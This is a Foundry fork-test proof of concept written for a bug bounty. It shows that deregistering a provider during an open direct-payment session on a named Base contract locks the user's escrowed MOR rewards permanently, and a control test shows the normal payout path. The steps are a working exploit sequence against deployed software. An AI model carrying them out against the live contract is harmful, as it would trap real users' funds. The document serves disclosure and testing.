// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

struct Provider {
    string endpoint;
    uint256 stake;
    uint128 createdAt;
    uint128 limitPeriodEnd;
    uint256 limitPeriodEarned;
    bool isDeleted;
}

struct Session {
    address user;
    bytes32 bidId;
    uint256 stake;
    bytes closeoutReceipt;
    uint256 closeoutType;
    uint256 providerWithdrawnAmount;
    uint128 openedAt;
    uint128 endsAt;
    uint128 closedAt;
    bool isActive;
    bool isDirectPaymentFromUser;
}

interface IDiamond {
    function providerRegister(address provider_, uint256 amount_, string calldata endpoint_) external;
    function providerDeregister(address provider_) external;
    function modelRegister(address modelOwner_, bytes32 baseModelId_, bytes32 ipfsCID_, uint256 fee_, uint256 amount_, string calldata name_, string[] memory tags_) external;
    function postModelBid(address provider_, bytes32 modelId_, uint256 pricePerSecond_) external returns (bytes32 bidId);
    function deleteModelBid(bytes32 bidId_) external;
    function openSession(address user_, uint256 amount_, bool isDirectPaymentFromUser_, bytes calldata approvalEncoded_, bytes calldata signature_) external returns (bytes32);
    function closeSession(bytes calldata receiptEncoded_, bytes calldata signature_) external;
    function claimForProvider(bytes32 sessionId_) external;
    function withdrawUserStakes(address user_, uint8 iterations_) external;
    function getModelId(address account_, bytes32 baseModelId_) external view returns (bytes32);
    function getProvider(address provider_) external view returns (Provider memory);
    function getSession(bytes32 sessionId_) external view returns (Session memory);
    function stakeToStipend(uint256 amount_, uint128 timestamp_) external view returns (uint256);
    function getMinMaxBidPricePerSecond() external view returns (uint256, uint256);
}

/// @title ProviderRegistry deregister locks direct-session user escrow — Morpheus bug bounty PoC
/// @notice Fork PoC pinned to Base block 58647015 (2026-11-17).
///         Target: LumerinDiamond 0x6aBE1d282f72B474E54527D93b979A4f64d3030a
///         (Base, Appendix A; ProviderRegistry + SessionRouter facets).
///         Run: forge test
/// @notice The bug: providerDeregister guards only on active bids, never open
///         sessions. At close, _rewardUserAfterClose charges the user the FULL
///         provider rewards (SessionRouter.sol:300) while _claimForProvider caps
///         payout at stake - limitPeriodEarned = 0 after deregister (L383-385);
///         the difference stays in the diamond with no recovery path (not
///         feeBalance, no sweep). No privileged accounts are used; the provider
///         exit is an ordinary permissionless action.
contract DeregisterOpenSessionTest is Test {
    address constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    uint256 constant FORK_BLOCK = 58647015;

    uint256 providerPk = 0x1111111111111111111111111111111111111111111111111111111111111111;
    uint256 userPk = 0x2222222222222222222222222222222222222222222222222222222222222222;
    uint256 modelOwnerPk = 0x3333333333333333333333333333333333333333333333333333333333333333;

    address provider;
    address user;
    address modelOwner;

    uint256 constant STAKE = 10 ether;
    uint256 constant SESSION_AMOUNT = 100 ether;

    function setUp() public {
        vm.createSelectFork("https://mainnet.base.org", FORK_BLOCK);
        provider = vm.addr(providerPk);
        user = vm.addr(userPk);
        modelOwner = vm.addr(modelOwnerPk);
        vm.deal(provider, 10 ether);
        vm.deal(user, 10 ether);
        vm.deal(modelOwner, 10 ether);
        deal(MOR, provider, 1000 ether);
        deal(MOR, user, 1000 ether);
        deal(MOR, modelOwner, 100 ether);
    }

    function _signProvider(bytes memory msg_) internal view returns (bytes memory) {
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(msg_)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(providerPk, digest);
        return abi.encodePacked(r, s, v);
    }

    // Register provider + model, post one bid. Returns (modelId, bidId, price).
    function _setupBid() internal returns (bytes32 modelId, bytes32 bidId, uint256 price) {
        vm.prank(provider);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);
        vm.prank(provider);
        IDiamond(DIAMOND).providerRegister(provider, STAKE, "example.com:8080");

        vm.prank(modelOwner);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);
        bytes32 baseModelId = keccak256("test-model-v1");
        modelId = IDiamond(DIAMOND).getModelId(modelOwner, baseModelId);
        string[] memory tags = new string[](1);
        tags[0] = "test";
        vm.prank(modelOwner);
        IDiamond(DIAMOND).modelRegister(modelOwner, baseModelId, bytes32("cid"), 0, 1 ether, "TestModel", tags);

        // Target ~100_000s session duration.
        uint256 stipend = IDiamond(DIAMOND).stakeToStipend(SESSION_AMOUNT, uint128(block.timestamp));
        price = stipend / 100_000;
        (uint256 minP, uint256 maxP) = IDiamond(DIAMOND).getMinMaxBidPricePerSecond();
        assertGe(price, minP);
        assertLe(price, maxP);

        vm.prank(provider);
        bidId = IDiamond(DIAMOND).postModelBid(provider, modelId, price);
    }

    function _openDirectSession(bytes32 bidId) internal returns (bytes32 sessionId) {
        bytes memory approval = abi.encode(bidId, block.chainid, user, uint128(block.timestamp));
        bytes memory sig = _signProvider(approval);
        vm.prank(user);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);
        vm.prank(user);
        sessionId = IDiamond(DIAMOND).openSession(user, SESSION_AMOUNT, true, approval, sig);
    }

    function _closeSession(bytes32 sessionId) internal {
        bytes memory receipt = abi.encode(sessionId, block.chainid, uint128(block.timestamp), uint32(10_000), uint32(100));
        bytes memory sig = _signProvider(receipt);
        vm.prank(user);
        IDiamond(DIAMOND).closeSession(receipt, sig);
    }

    function testDeregisterWithOpenDirectSessionLocksUserEscrow() public {
        (bytes32 modelId, bytes32 bidId, uint256 price) = _setupBid();
        modelId; // silence unused warning (model stays registered)
        uint256 diamondBeforeOpen = IERC20(MOR).balanceOf(DIAMOND);
        uint256 providerBalBefore = IERC20(MOR).balanceOf(provider);

        bytes32 sessionId = _openDirectSession(bidId);
        Session memory s0 = IDiamond(DIAMOND).getSession(sessionId);
        assertEq(s0.providerWithdrawnAmount, 0);
        uint256 duration = uint256(s0.endsAt) - uint256(s0.openedAt);
        assertGe(duration, 300); // >= MIN_SESSION_DURATION
        uint256 expectedRewards = duration * price;
        uint128 endsAt = s0.endsAt;

        // Provider exits mid-session: delete bid, then deregister (no open-session check).
        vm.warp(block.timestamp + 50_000);
        vm.prank(provider);
        IDiamond(DIAMOND).deleteModelBid(bidId);
        vm.prank(provider);
        IDiamond(DIAMOND).providerDeregister(provider);
        // Provider withdrew the full stake (earned == 0 so far).
        uint256 providerBalAfterDereg = IERC20(MOR).balanceOf(provider);
        assertEq(providerBalAfterDereg, providerBalBefore + STAKE);
        Provider memory pDereg = IDiamond(DIAMOND).getProvider(provider);
        assertTrue(pDereg.isDeleted);
        assertEq(pDereg.limitPeriodEarned, 0);
        assertEq(pDereg.stake, 0);

        // Session ends; user closes late. Provider payout is capped at stake(0) - earned(0) = 0,
        // but the user is still charged the full provider rewards.
        vm.warp(uint256(endsAt) + 10_000);
        uint256 userBalBeforeClose = IERC20(MOR).balanceOf(user);
        _closeSession(sessionId);
        Session memory sClosed = IDiamond(DIAMOND).getSession(sessionId);
        assertEq(sClosed.providerWithdrawnAmount, 0, "provider should receive 0 after deregister");
        assertEq(IERC20(MOR).balanceOf(provider), providerBalAfterDereg, "provider got nothing from close");

        // Provider cannot recover by claiming afterwards either.
        vm.prank(provider);
        IDiamond(DIAMOND).claimForProvider(sessionId);
        assertEq(IERC20(MOR).balanceOf(provider), providerBalAfterDereg, "claimForProvider pays 0");

        // User withdraws the day-locked remainder; the provider-rewards slice never comes back.
        vm.warp(block.timestamp + 2 days);
        vm.prank(user);
        IDiamond(DIAMOND).withdrawUserStakes(user, 10);
        assertEq(IERC20(MOR).balanceOf(user), 1000 ether - expectedRewards, "user lost exactly the provider rewards");
        assertEq(userBalBeforeClose, 900 ether, "user escrowed 100 MOR at open");

        // The rewards sit in the diamond with no withdrawal path (not feeBalance, no sweep).
        // (diamondBeforeOpen held the 10 MOR stake, which the provider withdrew at deregister.)
        assertEq(IERC20(MOR).balanceOf(DIAMOND), diamondBeforeOpen - STAKE + expectedRewards, "diamond keeps the rewards");
        emit log_named_uint("duration_seconds", duration);
        emit log_named_uint("price_per_second_wei", price);
        emit log_named_uint("user_mor_locked_wei", expectedRewards);
    }

    function testControlProviderStaysRegistered() public {
        (, bytes32 bidId, uint256 price) = _setupBid();
        uint256 diamondBeforeOpen = IERC20(MOR).balanceOf(DIAMOND);
        uint256 providerBalBefore = IERC20(MOR).balanceOf(provider);

        bytes32 sessionId = _openDirectSession(bidId);
        Session memory s0 = IDiamond(DIAMOND).getSession(sessionId);
        uint256 expectedRewards = (uint256(s0.endsAt) - uint256(s0.openedAt)) * price;

        vm.warp(uint256(s0.endsAt) + 10_000);
        _closeSession(sessionId);
        Session memory sClosed = IDiamond(DIAMOND).getSession(sessionId);
        assertEq(sClosed.providerWithdrawnAmount, expectedRewards, "registered provider is paid in full");
        assertEq(IERC20(MOR).balanceOf(provider), providerBalBefore + expectedRewards);

        vm.warp(block.timestamp + 2 days);
        vm.prank(user);
        IDiamond(DIAMOND).withdrawUserStakes(user, 10);
        assertEq(IERC20(MOR).balanceOf(user), 1000 ether - expectedRewards, "user pays the provider, as designed");
        assertEq(IERC20(MOR).balanceOf(DIAMOND), diamondBeforeOpen, "diamond keeps nothing extra");
    }
}
